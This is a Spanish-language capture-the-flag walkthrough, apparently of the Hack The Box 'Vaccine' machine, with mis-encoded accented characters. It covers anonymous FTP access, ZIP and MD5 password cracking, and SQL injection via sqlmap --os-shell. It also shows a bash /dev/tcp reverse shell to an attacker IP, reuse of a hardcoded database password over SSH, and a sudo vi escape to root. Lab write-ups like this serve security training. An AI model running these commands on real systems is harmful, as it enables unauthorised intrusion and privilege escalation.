------------
- Tags: #vulnerabilidad #database #CustomApplications #protocols #sourcecodeanalysis #apache #postgreSQL #FTP #php #Reconnaisance #passwordcracking #SUIDExploitation #sqlinjection #remotecodeexecution #cleartextcredentials #anonymous 
---------

![](../img/c7a88391914acc577e49721fb5184a07.png)

![](../img/5a99d93ef904c426d4e3b79ba04509cd.png)

### üõ∞Ô∏è Enumeraci√≥n inicial con Nmap

**Objetivo:** Descubrir qu√© servicios est√°n activos en la m√°quina objetivo.

![](../img/b54b516d5b0b0e0594eb3c6f2c8e46cd.png)

**Comando ejecutado:**
```bash
nmap -sS --top-ports 1000 -Pn 10.129.110.32
```

![](../img/0fa33c87a663d80e0679aaa179fb0024.png)

**Par√°metros explicados:**

- `-sS`: Escaneo SYN (stealth scan), r√°pido y menos ruidoso.
    
- `--top-ports 1000`: Escanea los 1000 puertos m√°s comunes.
    
- `-Pn`: No realiza ping previo, √∫til si ICMP est√° bloqueado.
    
- `10.129.110.32`: IP de la m√°quina "Vaccine".

üìå **Respuesta para la Task 1:** `ftp`  
(Es el otro servicio activo adem√°s de SSH y HTTP)


### üîê Task 2 ‚Äì Acceso an√≥nimo por FTP

**Pregunta:**

> Este servicio (FTP) puede configurarse para permitir el acceso con cualquier contrase√±a usando un nombre de usuario espec√≠fico.  
> ¬øCu√°l es ese nombre de usuario?

**üü¢ Respuesta:** `anonymous`

![](../img/6118416274485c566a17797927df58a5.png)

### üìò ¬øQu√© significa esto?

El servicio FTP (puerto 21) muchas veces se configura para que cualquier persona pueda acceder sin necesidad de una cuenta leg√≠tima, usando:

```bash
ftp 10.129.110.32
```

### üí° Importancia en Pentesting

- **Acceso an√≥nimo FTP** es una de las primeras cosas que se comprueban en una auditor√≠a.
    
- Puede revelar informaci√≥n sensible, como archivos de configuraci√≥n, credenciales o scripts antiguos.


### üìÅ TASK 3 - ¬øQu√© archivo est√° disponible para descarga?

El archivo mostrado en el listado FTP

![](../img/db4e5ec2641871e19cc2c53de8c4a724.png)


![](../img/2d44a7ee030c3191df8947523466c363.png)

‚úÖ **Respuesta TASK 3**: `backup.zip`

###  üîê TASK 4 ‚Äì Herramienta de John the Ripper para extraer hashes de ZIP

Bien, en nuestra siguiente tarea:

![](../img/f20d9ebd6a39f9b9bbccfdeea6adee07.png)

La respuesta seria: `zip2john

### üìò ¬øQu√© es `zip2john`?

`zip2john` es un script que viene incluido con **John The Ripper**. Su prop√≥sito es:

- **Extraer un hash** desde un archivo `.zip` protegido por contrase√±a.
    
- Generar ese hash en un formato especial que **John** puede usar para romper la contrase√±a con fuerza bruta o diccionario.

üß™ Ejemplo pr√°ctico:

```bash
zip2john backup.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

- `zip2john backup.zip`: convierte el archivo `.zip` en un hash.
    
- `john hash.txt --wordlist=...`: intenta descifrar la contrase√±a usando el diccionario `rockyou.txt`.

‚û°Ô∏è **Sirve para**: romper la contrase√±a de archivos `.zip`.


## üß† Crackeando un ZIP con John The Ripper

### üì¶ Paso 1: Obtener el hash del archivo `.zip`

Utilic√© la herramienta `zip2john`, incluida en el paquete de **John The Ripper**, para extraer el _hash_ de un archivo ZIP protegido por contrase√±a:

![](../img/b267e2c5a9792978260ff66c9e2795f7.png)

Esto gener√≥ una l√≠nea con el hash correspondiente al contenido cifrado del zip. Lo guard√© en el archivo `hash.txt` para poder crackearlo despu√©s.

### üìÑ Contenido del hash generado

Al ejecutar:

![](../img/000959ccf737cd3b8442b5405f1ca0d5.png)

Obtenemos unas lineas muy largas con el formato espec√≠fico que John necesita para intentar descifrar la clave.

## üîê Crackeando la contrase√±a del ZIP con John The Ripper

### üßæ Paso 1: Lanza el ataque de diccionario

Una vez que tienes el _hash_ en `hash.txt`, simplemente ejecutas el siguiente comando para intentar crackearlo usando un diccionario:

![](../img/30b644e838bd02b193bae26d15de1a59.png)

üìå En este caso, John encontr√≥ la contrase√±a: `741852963`

üß∞ Siguiente paso - Descomprimir backup.zip con la contrase√±a

üìÇ Archivos extra√≠dos:

- `index.php`
    
- `style.css`

![](../img/2a8d4741c193dc5877bc5f8a53b90966.png)

## üîê Task 5 ‚Äì Contrase√±a del usuario admin en la web

### üìå Situaci√≥n:

- Tras descomprimir el archivo `backup.zip`, revisamos el c√≥digo fuente del archivo `index.php`.
    
- All√≠ encontramos esta condici√≥n de autenticaci√≥n:

if ($_POST['username'] == 'admin' && md5($_POST['password']) == "2cb42f8734ea607eefed3b70af13bbd3")

![](../img/f9c607e9fb5e5f01f29fc755bc4a9980.png)

### üß† ¬øQu√© significa?

- El formulario valida que:
    
    - El **usuario** introducido es `admin`
        
    - La **contrase√±a**, al ser cifrada con `md5()`, coincida con el hash `2cb42f8734ea607eefed3b70af13bbd3`

### üîì Proceso de cracking del hash

- Usamos el sitio web [CrackStation](https://crackstation.net/)
    
- Introducimos el hash en la herramienta.
    
- Resultado devuelto:

![](../img/25495bf0dfbc6a5be3ca0897d5cf9afb.png)

üí° Esto significa que la contrase√±a real que el formulario espera es **qwerty789**

### üíâ Task 6 ‚Äì Obtener ejecuci√≥n de comandos con SQLMap

![](../img/2e0ae8a02dff48ee46da382c31f1c250.png)

### üß† Explicaci√≥n:

SQLMap permite no solo extraer informaci√≥n de bases de datos vulnerables, sino tambi√©n intentar ejecutar comandos en el sistema si encuentra una **inyecci√≥n SQL** que lo permita.

La opci√≥n que se utiliza para intentar ejecuci√≥n de comandos directamente desde SQLMap es:

```bash
--os-shell
```

### üõ†Ô∏è ¬øQu√© hace `--os-shell`?

- Lanza una shell interactiva si la inyecci√≥n permite ejecuci√≥n de sistema operativo.
    
- Es √∫til cuando la vulnerabilidad es lo suficientemente cr√≠tica como para ejecutar comandos directamente en la m√°quina v√≠ctima.

üí° Ejemplo de uso:

![](../img/3956537c3f9f691a94649abd603b0890.png)

### üìù Explicaci√≥n del resultado:

- SQLMap intenta inyectar comandos SQL que permitan la ejecuci√≥n remota de comandos en el sistema.
    
- El servidor responde con una cookie de sesi√≥n (`PHPSESSID`), y SQLMap te pregunta si quieres usarla para continuar.
    
- Al responder `Y`, SQLMap la utilizar√° para mantener una sesi√≥n v√°lida y proceder con la inyecci√≥n y prueba de ejecuci√≥n de comandos.
    

> ‚ö†Ô∏è Esta t√©cnica solo es posible si el servidor es vulnerable a **inyecci√≥n SQL con capacidad RCE (Remote Command Execution)**.

![](../img/7eceab330f083d9dd6773076d20a4638.png)

### üìù Resultado y an√°lisis:

- **Cookie detectada**: SQLMap detect√≥ que el servidor establece una cookie (`PHPSESSID`), y pregunt√≥ si deseabas usarla. Se respondi√≥ `y` (yes).
    
- **CRITICAL**: Se mostraron dos advertencias cr√≠ticas:
    
    - **WAF/IPS detectado**: El servidor parece estar protegido por un firewall o sistema de detecci√≥n de intrusos.
        
    - **Falta de par√°metros vulnerables**: SQLMap no encontr√≥ ning√∫n par√°metro en la URL (como `id=1`) que pueda ser probado para inyecci√≥n SQL.

### ‚úÖ Recomendaci√≥n para continuar:

Para que SQLMap pueda detectar formularios o par√°metros vulnerables nos dice:

**You are advised to rerun with '--forms --crawl=2'**

```bash
sqlmap -u "http://10.129.181.200/index.php" --forms --crawl=2 --os-shell
```


### üìå ¬øQu√© hacen esas opciones?

- `--forms`: Hace que SQLMap analice formularios HTML (como login o b√∫squeda).
    
- `--crawl=2`: Navega el sitio hasta 2 niveles de profundidad buscando enlaces y formularios.
    
- `--os-shell`: Intenta ejecutar comandos en el sistema si encuentra una inyecci√≥n con RCE.

## üß¨ Exploraci√≥n con SQLMap usando formularios (`--forms`) y rastreo (`--crawl`)

### üîé Comando usado:

![](../img/2d141327bb3f5d1de4c89ba13769f342.png)

### ‚úÖ Explicaci√≥n del an√°lisis:

1. **SQLMap detecta que no existe `sitemap.xml`**, lo cual es com√∫n y no impide el rastreo del sitio.
    
2. **Se realiza un rastreo del sitio web** (hasta profundidad 2) en b√∫squeda de formularios y par√°metros.
    
3. Se ejecuta en **modo de un solo hilo (thread)** por defecto.
    
4. Se guarda el resultado del rastreo en un archivo temporal `.csv`.
    
5. **Detecta un formulario vulnerable**:

6. **SQLMap** pregunta si deseas testear ese formulario ‚Üí aqu√≠ debes contestar **"Y"** para que comience la explotaci√≥n.


Vemos que con este comando , no nos deja seguir con los pasos que es; poder entrar a la shell.

Asi que :

## üîë Login web

Accedemos v√≠a navegador a `http://10.129.110.32`  
Credenciales:

- **Usuario**: admin
    
- **Contrase√±a**: qwerty789
    

Redirige a `/dashboard.php`


![](../img/22f1897c7bbfe869b8eda161502366bb.png)

## ü©∫ Paso 7 ‚Äì Ejecuci√≥n de comandos con SQLMap (`--os-shell`)

üß™ **Objetivo:** Obtener ejecuci√≥n remota de comandos (RCE) a trav√©s de una inyecci√≥n SQL explotada con SQLMap.

### üß† Contexto previo

Durante el an√°lisis inicial del sitio web `http://10.129.240.61/dashboard.php`, se identific√≥ el par√°metro **`search`** como vulnerable a **inyecci√≥n SQL**.

Esto se confirm√≥ con SQLMap, al detectar que la inyecci√≥n permit√≠a ejecutar consultas `UNION`, as√≠ como **stacked queries** (consultas apiladas), t√≠picas de bases de datos PostgreSQL. Esto es clave para conseguir **RCE**.

Adem√°s, al analizar las peticiones HTTP del navegador, se detect√≥ que la aplicaci√≥n genera una **cookie de sesi√≥n PHP** (por ejemplo, `PHPSESSID=rkfpa7ka8u9lqrrshbuhr70bn`). Esta cookie es **necesaria** para que SQLMap mantenga una sesi√≥n v√°lida, como si fu√©ramos un usuario autenticado navegando por la web.


‚öôÔ∏è Comando ejecutado:

```bash
sqlmap -u 'http://10.129.240.61/dashboard.php?search=any+query' --cookie="PHPSESSID=rkfpa7ka8u9lqrrshbuhr70bn" --os-shell
```

![](../img/93435852a13ca205ab3c1c0b86e30f22.png)

![](../img/51785dd4bcf99136a0d45d8d5fcb1621.png)

#### üìå Explicaci√≥n detallada del comando:

|Opci√≥n|Funci√≥n|
|---|---|
|`-u`|Indica la URL objetivo, con el par√°metro vulnerable (`search`) ya incluido.|
|`'search=any+query'`|Es una cadena de prueba inocua (valor dummy) que activa el procesamiento del par√°metro vulnerable sin romper la petici√≥n.|
|`--cookie=...`|Permite a SQLMap enviar la cookie de sesi√≥n PHP obtenida previamente, para que la aplicaci√≥n no bloquee las peticiones por falta de autenticaci√≥n.|
|`--os-shell`|Intenta ejecutar comandos directamente en el sistema si la inyecci√≥n lo permite (en este caso, usando `COPY FROM PROGRAM` de PostgreSQL).|

![](../img/4c7a793d5dbe5e631c4b5b46bc3ad090.png)

### üñ•Ô∏è Resultado obtenido

- Se abre una shell interactiva controlada por SQLMap.
    
- Usuario actual: `postgres`
    
- Sistema remoto: Ubuntu 20.04 (`vaccine`)
    
- Shell limitada, pero suficiente para lanzar comandos y obtener una reverse shell mejorada.


## üóÇÔ∏è Paso 8 ‚Äì Listado y an√°lisis de `/var/www/html`

üîç **Objetivo:** Buscar credenciales o configuraci√≥n sensible en archivos del servidor web.

üìé **Comando ejecutado:**
```bash
ls -l /var/www/html
```

üì• **Archivos encontrados:**

![](../img/e6e42d06bb08c3ed7a6bab0841073c9b.png)

üß† **An√°lisis:**  
No se encuentra un archivo `config.php`, por lo que no hay credenciales directas. El archivo `license.txt` indica que el sitio est√° basado en un tutorial p√∫blico, lo que puede implicar pr√°cticas inseguras o contrase√±as por defecto.

## üíª Paso 9 ‚Äì Establecer reverse shell persistente

üéØ **Objetivo:** Obtener una reverse shell interactiva m√°s estable que permita mayor control.

üìé **Comando lanzado desde SQLMap (os-shell):**

```bash
bash -c "bash -i >& /dev/tcp/10.10.16.54/443 0>&1"
```


![](../img/a56bd4409ec54124889846426ddcbe8e.png)

üìé **En el atacante:**

![](../img/5aa509bdf19fe1d3a58c68b5caeed769.png)

üì• **Resultado:**

- Se recibe la shell en `nc`.
    
- Usuario: `postgres`
    
- Ruta actual: `/var/lib/postgresql/11/main`
    
![](../img/72581aa8ff5eb3fe2ecfecc5b6db2cd1.png)

üß† **Ventaja:** Esta shell es m√°s interactiva que la ofrecida por SQLMap. Podemos ahora ejecutar comandos sin esperar a que SQLMap responda.

## üïµÔ∏è Paso 10 ‚Äì B√∫squeda de credenciales en c√≥digo fuente del servidor

üß™ **Objetivo:** Identificar informaci√≥n sensible (como contrase√±as) en los archivos PHP del servidor web para intentar moverse lateralmente o escalar privilegios.

---

### üìÇ Exploraci√≥n de `/var/www/html`

Tras obtener la reverse shell como `postgres`, accedemos al directorio web del sistema:

![](../img/b63fde6888083c3898463a8939a711d3.png)

üìÑ Se encontraron varios archivos, entre ellos: `index.php`, `dashboard.php`, `dashboard.js`, `dashboard.css`, `license.txt`.

### üîç An√°lisis de `dashboard.php`

Visualizamos el contenido del archivo `dashboard.php`:

üí° **Hallazgo importante:**

Dentro del bloque PHP encargado de conectarse a la base de datos PostgreSQL, encontramos las siguientes l√≠neas:

```bash
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@ssw0rd!");
```

![](../img/087da39b9773b5fb1409c5749cd682d1.png)

üìå La contrase√±a `P@ssw0rd!` est√° **hardcodeada** (escrita directamente en el c√≥digo fuente).

### üß† An√°lisis:

- El usuario que se conecta a PostgreSQL con esa contrase√±a es `postgres`.
    
- Es posible que esa misma contrase√±a se reutilice en otros servicios, como **SSH** o en otros usuarios del sistema.


## üîê Paso 11 ‚Äì Acceso SSH reutilizando la contrase√±a encontrada

üéØ **Objetivo:** Probar si la contrase√±a `P@ssw0rd!` tambi√©n es v√°lida para el usuario `postgres` en SSH.

üìé Comando utilizado:

```bash
ssh postgres@IP
```

![](../img/18803d40267943565ccea5e6e4dc1c34.png)

üí¨ Se pidi√≥ confirmar la clave del host la primera vez (respuesta: `yes`)  

üîê Se introdujo la contrase√±a encontrada: `P@ssw0rd!`

üì• **Resultado:**

- Acceso SSH conseguido correctamente como usuario `postgres`.
    
- Shell completamente interactiva.
    
- Sin restricciones como las impuestas por SQLMap o reverse shells limitadas.

### üèÅ Flag de usuario obtenida:

![](../img/f6019566e7acb162edb621a4c8a8d6d0.png)

![](../img/3280ff635467b648f7cace4ac7fe98aa.png)

## üß® Paso 12 ‚Äì Escalada de privilegios con `sudo -l`

### üß† Objetivo: Comprobar si el usuario actual (`postgres`) tiene privilegios de `sudo` que permitan escalar a root.

### üîπ Comando ejecutado:

```bash
sudo -l
```

### üìå Resultado:

- El usuario `postgres` puede ejecutar: (como root)

![](../img/720172c61d3b16d225d9a5b432aad816.png)

## üîì Paso 13 ‚Äì Abuso de `vi` para conseguir acceso root

### üõ†Ô∏è Objetivo: Escalar privilegios a `root` usando `vi` con permisos `sudo`.

### üîπ Comando ejecutado:

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

![](../img/b1969256e75dbdf87bd0cfcf6117b981.png)

### üß† T√©cnica usada:

Una vez dentro de `vi`, ejecutamos lo siguiente para obtener una shell como `root`:

```bash
:shell
```

![](../img/a76cdc9e7b0a5b350c330769ce541875.png)

### üî• Resultado:

- Acceso root obtenido.


## üèÅ Paso 14 ‚Äì Lectura de la flag de root

### üìÅ Ubicaci√≥n com√∫n: `/root/root.txt`

![](../img/cfb211fcbc974587f7a733ffdc3ad02f.png)

üéâ ¬°M√°quina completada con √©xito! Acceso root conseguido y flag capturada. ‚úÖ

